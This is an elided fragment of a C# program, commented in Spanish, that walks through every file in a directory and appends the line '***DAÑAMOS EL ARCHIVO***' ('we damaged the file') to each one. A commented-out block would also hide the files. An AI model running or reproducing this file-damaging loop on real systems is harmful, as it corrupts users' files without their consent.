		...
		public static void Main(string[] args)
		{
			...
			*/
			...
			foreach(string arch in Directory.EnumerateFiles(path))
			{
				...
				// Cambiar atributos de los archivos
				// Normal, Solo lectura, Ocultos, Archivo
				/*try
				{
					File.SetAttributes(arch, FileAttributes.Hidden);
					Console.WriteLine("Se modificó el atributo del archivo");
				}
				catch(Exception e)
				{
					Console.WriteLine("Fallo al colocar atributos {0}", e.ToString());
				}*/
				
				// Agregar información al archivo
				using (StreamWriter sw = File.AppendText(arch))
				{
					sw.WriteLine("***DAÑAMOS EL ARCHIVO***");
					sw.WriteLine("Por mi =D");
				}
